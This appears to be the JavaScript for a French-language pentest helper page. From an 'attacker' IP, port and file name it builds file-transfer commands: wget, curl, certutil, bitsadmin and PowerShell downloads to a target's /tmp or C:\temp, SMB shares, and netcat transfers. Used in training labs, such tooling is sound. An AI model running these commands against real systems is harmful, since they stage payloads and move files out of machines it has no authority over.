// Configuration globale
let globalConfig = {
    attackerOS: 'unix',
    attackerIP: '10.10.14.1',
    listenPort: '8000',
    targetOS: 'linux',
    fileName: 'exploit.sh',
    targetPath: '/tmp/'
};

// Historique des commandes
let commandHistory = JSON.parse(localStorage.getItem('fileTransferHistory')) || [];

// Initialisation
document.addEventListener('DOMContentLoaded', function() {
    initializeEventListeners();
    loadHistory();
    updateAllCommands();
    filterAndUpdateMethods();
});

// Event listeners
function initializeEventListeners() {
    // Configuration - mise à jour en temps réel
    document.getElementById('attackerOS').addEventListener('change', handleConfigChange);
    document.getElementById('attackerIP').addEventListener('input', handleConfigChange);
    document.getElementById('listenPort').addEventListener('input', handleConfigChange);
    document.getElementById('targetOS').addEventListener('change', handleConfigChange);
    document.getElementById('fileName').addEventListener('input', handleConfigChange);
    document.getElementById('targetPath').addEventListener('input', handleConfigChange);
    
    // Boutons
    document.getElementById('generateCommands').addEventListener('click', generateAllCommands);
    document.getElementById('resetConfig').addEventListener('click', resetConfig);
    document.getElementById('clearHistory').addEventListener('click', clearHistory);
    document.getElementById('exportHistory').addEventListener('click', exportHistory);
    
    // Boutons de dépliage/repliage
    document.getElementById('expandAll').addEventListener('click', expandAllMethods);
    document.getElementById('collapseAll').addEventListener('click', collapseAllMethods);
}

// Gestion des changements de configuration
function handleConfigChange() {
    updateGlobalConfig();
    updateAllCommands();
    filterAndUpdateMethods();
    updateTargetPathPlaceholder();
}

// Mise à jour de la configuration globale
function updateGlobalConfig() {
    globalConfig.attackerOS = document.getElementById('attackerOS').value;
    globalConfig.attackerIP = document.getElementById('attackerIP').value || '10.10.14.1';
    globalConfig.listenPort = document.getElementById('listenPort').value || '8000';
    globalConfig.targetOS = document.getElementById('targetOS').value;
    globalConfig.fileName = document.getElementById('fileName').value || 'exploit.sh';
    globalConfig.targetPath = document.getElementById('targetPath').value || getDefaultPath();
}

// Obtenir le chemin par défaut selon l'OS
function getDefaultPath() {
    switch(globalConfig.targetOS) {
        case 'windows':
            return 'C:\\temp\\';
        case 'macos':
            return '/tmp/';
        case 'linux':
        default:
            return '/tmp/';
    }
}

// Mettre à jour le placeholder du chemin de destination
function updateTargetPathPlaceholder() {
    const targetPathInput = document.getElementById('targetPath');
    if (targetPathInput) {
        targetPathInput.placeholder = getDefaultPath();
        if (!targetPathInput.value) {
            globalConfig.targetPath = getDefaultPath();
        }
    }
}

// Filtrer et mettre à jour les méthodes selon les OS
function filterAndUpdateMethods() {
    const { attackerOS, targetOS } = globalConfig;
    const methodCards = document.querySelectorAll('.method-card');
    
    // Définir quelles méthodes sont disponibles pour chaque combinaison
    const availableMethods = getAvailableMethodsForOS(attackerOS, targetOS);
    
    methodCards.forEach(card => {
        const method = card.dataset.method;
        
        if (availableMethods.includes(method)) {
            card.style.display = 'block';
            card.style.animation = 'fadeInUp 0.6s ease-out';
        } else {
            card.style.display = 'none';
        }
    });
    
    updateMethodsCounter();
    filterCommandsByTargetOS();
}

// Filtrer les commandes selon l'OS cible
function filterCommandsByTargetOS() {
    const targetOS = globalConfig.targetOS;
    
    // Pour chaque méthode, filtrer les commandes selon l'OS cible
    document.querySelectorAll('.command-variants').forEach(variants => {
        const commandBlocks = variants.querySelectorAll('.command-block');
        
        commandBlocks.forEach(block => {
            const label = block.querySelector('.command-label').textContent.toLowerCase();
            let shouldShow = true;
            
            // Filtrer selon l'OS cible
            if (targetOS === 'linux' || targetOS === 'macos') {
                // Pour Linux/macOS, cacher les commandes Windows
                if (label.includes('windows') || label.includes('powershell') || 
                    label.includes('certutil') || label.includes('bitsadmin')) {
                    shouldShow = false;
                }
            } else if (targetOS === 'windows') {
                // Pour Windows, cacher les commandes Unix spécifiques
                if (label.includes('linux') || label.includes('macos') || 
                    (label.includes('wget') && !label.includes('windows')) ||
                    (label.includes('curl') && !label.includes('windows'))) {
                    shouldShow = false;
                }
            }
            
            block.style.display = shouldShow ? 'block' : 'none';
        });
    });
}

// Obtenir les méthodes disponibles selon les OS
function getAvailableMethodsForOS(attackerOS, targetOS) {
    const combinations = {
        // Unix vers Linux
        'unix-linux': ['http', 'scp', 'netcat', 'base64'],
        
        // Unix vers Windows
        'unix-windows': ['http', 'smb', 'netcat', 'base64', 'ftp'],
        
        // Unix vers macOS
        'unix-macos': ['http', 'scp', 'netcat', 'base64'],
        
        // Windows vers Linux
        'windows-linux': ['http', 'netcat', 'base64', 'ftp'],
        
        // Windows vers Windows
        'windows-windows': ['http', 'smb', 'netcat', 'base64', 'ftp'],
        
        // Windows vers macOS
        'windows-macos': ['http', 'netcat', 'base64'],
        
        // macOS vers Linux
        'macos-linux': ['http', 'scp', 'netcat', 'base64'],
        
        // macOS vers Windows
        'macos-windows': ['http', 'smb', 'netcat', 'base64', 'ftp'],
        
        // macOS vers macOS
        'macos-macos': ['http', 'scp', 'netcat', 'base64']
    };
    
    const key = `${attackerOS}-${targetOS}`;
    return combinations[key] || ['http', 'netcat', 'base64']; // Fallback
}

// Mettre à jour le compteur de méthodes
function updateMethodsCounter() {
    const visibleMethods = document.querySelectorAll('.method-card[style*="block"]').length;
    
    let counter = document.querySelector('.methods-counter');
    if (!counter) {
        counter = document.createElement('div');
        counter.className = 'methods-counter';
        const methodsSection = document.querySelector('.methods-section');
        if (methodsSection) {
            const firstMethod = methodsSection.querySelector('.method-card');
            if (firstMethod) {
                methodsSection.insertBefore(counter, firstMethod);
            }
        }
    }
    
    counter.innerHTML = `
        <div class="counter-content">
            <span class="counter-text">
                <strong>${visibleMethods}</strong> méthodes disponibles
            </span>
            <span class="counter-subtitle">
                ${getOSDisplayName(globalConfig.attackerOS)} → ${getOSDisplayName(globalConfig.targetOS)}
            </span>
        </div>
    `;
}

// Obtenir le nom d'affichage de l'OS
function getOSDisplayName(os) {
    const names = {
        'unix': '🐧 Unix/Linux',
        'linux': '🐧 Linux',
        'windows': '🪟 Windows',
        'macos': '🍎 macOS'
    };
    return names[os] || os;
}

// Mise à jour de toutes les commandes avec les paramètres actuels
function updateAllCommands() {
    const { attackerIP, listenPort, fileName, targetPath, targetOS } = globalConfig;
    
    // Déterminer l'extension du chemin selon l'OS
    const fullPath = targetOS === 'windows' 
        ? (targetPath.endsWith('\\') ? targetPath + fileName : targetPath + '\\' + fileName)
        : (targetPath.endsWith('/') ? targetPath + fileName : targetPath + '/' + fileName);
    
    // HTTP Server commands
    updateCommand('httpServerPython3', `python3 -m http.server ${listenPort} --bind 0.0.0.0`);
    updateCommand('httpServerPython2', `python -m SimpleHTTPServer ${listenPort}`);
    updateCommand('httpServerPHP', `php -S 0.0.0.0:${listenPort}`);
    updateCommand('httpServerRuby', `ruby -run -e httpd . -p ${listenPort}`);
    updateCommand('httpServerNode', `npx http-server -p ${listenPort} --host 0.0.0.0`);
    
    // HTTP Client commands - filtrées selon l'OS cible
    if (targetOS === 'linux' || targetOS === 'macos') {
        updateCommand('httpClientWget', `wget "http://${attackerIP}:${listenPort}/${fileName}" -O "${fullPath}"`);
        updateCommand('httpClientCurl', `curl -o "${fullPath}" "http://${attackerIP}:${listenPort}/${fileName}"`);
    }
    
    if (targetOS === 'windows') {
        updateCommand('httpClientPowershell', `Invoke-WebRequest -Uri "http://${attackerIP}:${listenPort}/${fileName}" -OutFile "${fullPath}"`);
        updateCommand('httpClientCertutil', `certutil -urlcache -split -f "http://${attackerIP}:${listenPort}/${fileName}" "${fullPath}"`);
        updateCommand('httpClientBitsadmin', `bitsadmin /transfer myDownloadJob /download /priority normal "http://${attackerIP}:${listenPort}/${fileName}" "${fullPath}"`);
    }
    
    // SCP commands
    updateCommand('scpToTarget', `scp "${fileName}" user@target_ip:"${fullPath}"`);
    updateCommand('scpCustomPort', `scp -P 2222 "${fileName}" user@target_ip:"${fullPath}"`);
    updateCommand('sftpInteractive', `sftp user@target_ip`);
    
    // Netcat commands
    updateCommand('netcatSender', `nc -w 3 ${attackerIP} ${listenPort} < "${fileName}"`);
    updateCommand('netcatReceiver', `nc -l -p ${listenPort} > "${fullPath}"`);
    updateCommand('netcatReceiverTarget', `nc -l -p ${listenPort} > "${fullPath}"`);
    updateCommand('netcatSenderAttacker', `nc target_ip ${listenPort} < "${fileName}"`);
    
    // Base64 commands
    if (targetOS === 'linux' || targetOS === 'macos') {
        updateCommand('base64Encode', `base64 -w 0 "${fileName}"`);
        updateCommand('base64Decode', `echo "BASE64_STRING" | base64 -d > "${fullPath}"`);
    }
    
    if (targetOS === 'windows') {
        updateCommand('base64EncodeWin', `certutil -encode "${fileName}" encoded.txt`);
        updateCommand('base64DecodeWin', `certutil -decode encoded.txt "${fullPath}"`);
    }
    
    // FTP commands
    updateCommand('ftpServerPython', `python3 -m pyftpdlib -p 21 -w`);
    updateCommand('ftpServerAuth', `python3 -m pyftpdlib -p 21 -u user -P pass`);
    
    if (targetOS === 'linux' || targetOS === 'macos') {
        updateCommand('ftpClientLinux', `wget ftp://${attackerIP}/${fileName} -O "${fullPath}"`);
    }
    
    if (targetOS === 'windows') {
        updateCommand('ftpClientWindows', `powershell -c "(New-Object Net.WebClient).DownloadFile('ftp://${attackerIP}/${fileName}', '${fullPath}')"`);
    }
    
    // SMB commands (principalement pour Windows)
    updateCommand('smbServer', `impacket-smbserver share . -smb2support`);
    updateCommand('smbServerAuth', `impacket-smbserver share . -smb2support -user user -password pass`);
    
    if (targetOS === 'windows') {
        updateCommand('smbCopy', `copy "\\\\${attackerIP}\\share\\${fileName}" "${fullPath}"`);
        updateCommand('smbRobocopy', `robocopy "\\\\${attackerIP}\\share" "${targetPath}" "${fileName}"`);
    }
}

// Fonction utilitaire pour mettre à jour une commande
function updateCommand(elementId, command) {
    const element = document.getElementById(elementId);
    if (element) {
        element.textContent = command;
        element.parentElement.classList.add('updated');
        setTimeout(() => {
            element.parentElement.classList.remove('updated');
        }, 1000);
    }
}

// Génération de toutes les commandes
function generateAllCommands() {
    updateAllCommands();
    showNotification('Toutes les commandes ont été mises à jour!', 'success');
}

// Réinitialisation de la configuration
function resetConfig() {
    document.getElementById('attackerOS').value = 'unix';
    document.getElementById('attackerIP').value = '';
    document.getElementById('listenPort').value = '';
    document.getElementById('targetOS').value = 'linux';
    document.getElementById('fileName').value = '';
    document.getElementById('targetPath').value = '';
    
    handleConfigChange();
    showNotification('Configuration réinitialisée!', 'info');
}

// Fonction de copie de commande
function copyCommand(elementId) {
    const element = document.getElementById(elementId);
    if (!element) return;
    
    const command = element.textContent;
    
    navigator.clipboard.writeText(command).then(() => {
        // Ajouter à l'historique
        addToHistory(command);
        
        // Feedback visuel
        const copyBtn = element.parentElement.querySelector('.copy-btn');
        if (copyBtn) {
            const originalText = copyBtn.textContent;
            copyBtn.textContent = '✓';
            copyBtn.style.background = '#10b981';
            
            setTimeout(() => {
                copyBtn.textContent = originalText;
                copyBtn.style.background = '';
            }, 1000);
        }
        
        showNotification('Commande copiée!', 'success');
    }).catch(() => {
        showNotification('Erreur lors de la copie', 'error');
    });
}

// Gestion de l'historique
function addToHistory(command) {
    const historyItem = {
        command: command,
        timestamp: new Date().toLocaleString('fr-FR'),
        config: { ...globalConfig } // Sauvegarder la config utilisée
    };
    
    // Éviter les doublons récents (dernières 5 entrées)
    const recentCommands = commandHistory.slice(0, 5).map(item => item.command);
    if (!recentCommands.includes(command)) {
        commandHistory.unshift(historyItem);
        
        // Limiter à 50 entrées
        if (commandHistory.length > 50) {
            commandHistory = commandHistory.slice(0, 50);
        }
        
        localStorage.setItem('fileTransferHistory', JSON.stringify(commandHistory));
        updateHistoryDisplay();
    }
}

function loadHistory() {
    updateHistoryDisplay();
}

function updateHistoryDisplay() {
    const historyContainer = document.getElementById('commandHistory');
    if (!historyContainer) return;
    
    if (commandHistory.length === 0) {
        historyContainer.innerHTML = `
            <div class="history-empty">
                <span class="empty-icon">📝</span>
                <p>Aucune commande copiée pour le moment</p>
                <p class="empty-subtitle">Les commandes que vous copiez apparaîtront ici avec leur contexte</p>
            </div>
        `;
        return;
    }
    
    historyContainer.innerHTML = commandHistory.map((item, index) => `
        <div class="history-item" data-index="${index}">
            <div class="history-main">
                <div class="history-command">${escapeHtml(item.command)}</div>
                <div class="history-meta">
                    <div class="history-time">${item.timestamp}</div>
                    ${item.config ? `
                        <div class="history-config">
                            ${getOSDisplayName(item.config.attackerOS)} → ${getOSDisplayName(item.config.targetOS)} 
                            | ${item.config.fileName} → ${item.config.targetPath}
                        </div>
                    ` : ''}
                </div>
            </div>
            <button class="copy-btn" onclick="copyFromHistory('${escapeHtml(item.command)}')">📋</button>
        </div>
    `).join('');
}

function copyFromHistory(command) {
    navigator.clipboard.writeText(command).then(() => {
        showNotification('Commande copiée depuis l\'historique!', 'success');
    });
}

function clearHistory() {
    if (confirm('Êtes-vous sûr de vouloir vider l\'historique ?')) {
        commandHistory = [];
        localStorage.removeItem('fileTransferHistory');
        updateHistoryDisplay();
        showNotification('Historique vidé!', 'success');
    }
}

function exportHistory() {
    if (commandHistory.length === 0) {
        showNotification('Aucun historique à exporter', 'warning');
        return;
    }
    
    const exportData = commandHistory.map(item => 
        `[${item.timestamp}] ${item.command}${item.config ? ` (${getOSDisplayName(item.config.attackerOS)} → ${getOSDisplayName(item.config.targetOS)}: ${item.config.fileName})` : ''}`
    ).join('\n');
    
    const blob = new Blob([exportData], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `file-transfer-history-${new Date().toISOString().split('T')[0]}.txt`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
    
    showNotification('Historique exporté!', 'success');
}

// Utilitaires
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Fonction pour afficher une notification
function showNotification(message, type = 'info') {
    // Créer l'élément de notification
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.innerHTML = `
        <div class="notification-content">
            <span class="notification-message">${message}</span>
            <button class="notification-close">×</button>
        </div>
    `;
    
    // Ajouter au DOM
    document.body.appendChild(notification);
    
    // Animation d'entrée
    setTimeout(() => {
        notification.classList.add('show');
    }, 100);
    
    // Fermer automatiquement après 3 secondes
    setTimeout(() => {
        notification.classList.remove('show');
        setTimeout(() => {
            document.body.removeChild(notification);
        }, 300);
    }, 3000);
    
    // Fermer manuellement
    notification.querySelector('.notification-close').addEventListener('click', () => {
        notification.classList.remove('show');
        setTimeout(() => {
            document.body.removeChild(notification);
        }, 300);
    });
}

// Fonction pour déplier toutes les méthodes
function expandAllMethods() {
    // Utiliser Bootstrap collapse pour déplier toutes les méthodes
    const collapseElements = document.querySelectorAll('.collapse');
    collapseElements.forEach(collapse => {
        if (!collapse.classList.contains('show')) {
            // Créer une instance Bootstrap Collapse et la montrer
            const bsCollapse = new bootstrap.Collapse(collapse, {
                toggle: false
            });
            bsCollapse.show();
        }
    });
    
    // Mettre à jour les boutons toggle
    const methodToggles = document.querySelectorAll('.method-toggle');
    methodToggles.forEach(toggle => {
        toggle.classList.remove('collapsed');
        toggle.setAttribute('aria-expanded', 'true');
    });
    
    // Feedback visuel
    const expandBtn = document.getElementById('expandAll');
    expandBtn.innerHTML = '✅ Tout Déplié';
    expandBtn.style.background = 'linear-gradient(135deg, #27ae60, #2ecc71)';
    expandBtn.style.color = 'white';
    
    setTimeout(() => {
        expandBtn.innerHTML = '📖 Tout Déplier';
        expandBtn.style.background = '';
        expandBtn.style.color = '';
    }, 2000);
}

// Fonction pour replier toutes les méthodes
function collapseAllMethods() {
    // Utiliser Bootstrap collapse pour replier toutes les méthodes
    const collapseElements = document.querySelectorAll('.collapse');
    collapseElements.forEach(collapse => {
        if (collapse.classList.contains('show')) {
            // Créer une instance Bootstrap Collapse et la cacher
            const bsCollapse = new bootstrap.Collapse(collapse, {
                toggle: false
            });
            bsCollapse.hide();
        }
    });
    
    // Mettre à jour les boutons toggle
    const methodToggles = document.querySelectorAll('.method-toggle');
    methodToggles.forEach(toggle => {
        toggle.classList.add('collapsed');
        toggle.setAttribute('aria-expanded', 'false');
    });
    
    // Feedback visuel
    const collapseBtn = document.getElementById('collapseAll');
    collapseBtn.innerHTML = '✅ Tout Replié';
    collapseBtn.style.background = 'linear-gradient(135deg, #e74c3c, #c0392b)';
    collapseBtn.style.color = 'white';
    
    setTimeout(() => {
        collapseBtn.innerHTML = '📕 Tout Replier';
        collapseBtn.style.background = '';
        collapseBtn.style.color = '';
    }, 2000);
}

// Styles pour les animations et améliorations
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
    
    @keyframes slideOut {
        from { transform: translateX(0); opacity: 1; }
        to { transform: translateX(100%); opacity: 0; }
    }
    
    .command-block.updated {
        animation: highlight 1s ease-out;
    }
    
    @keyframes highlight {
        0% { background: rgba(99, 102, 241, 0.2); }
        100% { background: transparent; }
    }
    
    .methods-counter {
        background: linear-gradient(135deg, rgba(99, 102, 241, 0.1), rgba(139, 92, 246, 0.1));
        border: 1px solid rgba(99, 102, 241, 0.2);
        border-radius: var(--border-radius);
        padding: 1.5rem;
        margin-bottom: 2rem;
        text-align: center;
    }
    
    .counter-content {
        display: flex;
        flex-direction: column;
        gap: 0.5rem;
    }
    
    .counter-text {
        font-size: 1rem;
        font-weight: 600;
        color: var(--text-primary);
    }
    
    .counter-subtitle {
        font-size: 0.875rem;
        color: var(--text-secondary);
        opacity: 0.8;
    }
    
    .counter-text strong {
        color: var(--primary-color);
    }
    
    .history-main {
        flex: 1;
        display: flex;
        flex-direction: column;
        gap: 0.5rem;
    }
    
    .history-meta {
        display: flex;
        flex-direction: column;
        gap: 0.25rem;
    }
    
    .history-config {
        font-size: 0.75rem;
        color: var(--text-tertiary);
        opacity: 0.8;
        font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
    }
    
    .empty-subtitle {
        font-size: 0.875rem;
        opacity: 0.7;
        margin-top: 0.5rem;
    }
`;
document.head.appendChild(style); 